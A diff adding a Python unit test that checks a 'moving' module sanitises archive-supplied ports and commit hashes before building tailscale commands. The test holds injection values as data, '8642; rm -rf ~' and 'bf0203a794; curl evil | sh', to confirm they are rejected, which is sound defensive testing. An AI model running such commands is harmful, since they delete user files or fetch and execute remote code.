@@ -216,3 +216,14 @@ def test_moving_stops_this_install_and_resume_starts_it_again(tmp_path, monkeypa
     assert not any("bipagents-browser-vie" in c for c in ran)   # browsers start when used
     assert ran[-1][1:] == ["gateway", "install", "--start-now", "--start-on-login"]
     assert moving.resume(runner, tmp_path) == []   # once
+
+
+def test_an_archive_s_ports_and_hermes_commit_never_reach_a_shell():
+    assert moving.serve_commands("/usr/bin/tailscale", [8642, 8643]) == [
+        ["/usr/bin/tailscale", "serve", "--bg", "--https=8642", "http://127.0.0.1:8642"],
+        ["/usr/bin/tailscale", "serve", "--bg", "--https=8643", "http://127.0.0.1:8643"]]
+    assert moving.serve_commands(None, ["8642; rm -rf ~", 70000, True, 443]) == [
+        ["tailscale", "serve", "--bg", "--https=443", "http://127.0.0.1:443"]]
+    assert moving.archive_commit({"hermes_commit": "bf0203a794"}) == "bf0203a794"
+    for bad in ("bf0203a794; curl evil | sh", "main", "", None, 12):
+        assert moving.archive_commit({"hermes_commit": bad}) is None
